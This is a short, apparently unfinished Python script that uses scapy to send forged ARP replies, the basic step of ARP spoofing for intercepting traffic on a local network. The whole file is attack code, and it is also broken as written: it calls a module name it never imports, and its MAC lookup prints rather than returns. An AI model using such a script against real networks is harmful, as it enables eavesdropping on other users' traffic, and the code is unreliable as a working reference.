#!python3
from socket import timeout
import scapy.all as sc

# referance code:
# https://www.programcreek.com/python/example/103593/scapy.all.srp

def getMac(ip):
    ar = scapy.ARP(pdst=ip)
    bc = scapy.Ether(dst  = 'ff:ff:ff:ff:ff:ff')
    arbc = bc/ar
    al = scapy.srp(arbc,timeout=1)#try without this first to see full list//[0]//#could use srp1- only returns the first answer
    print(al)
    
def spoof(targetIP,spoofIP):
    targetMac = getMac(targetIP)
    pkt = scapy.ARP(op=2, pdst = targetIP, hwdst = targetMac, psrc = spoofIP)
    sc.send(pkt)
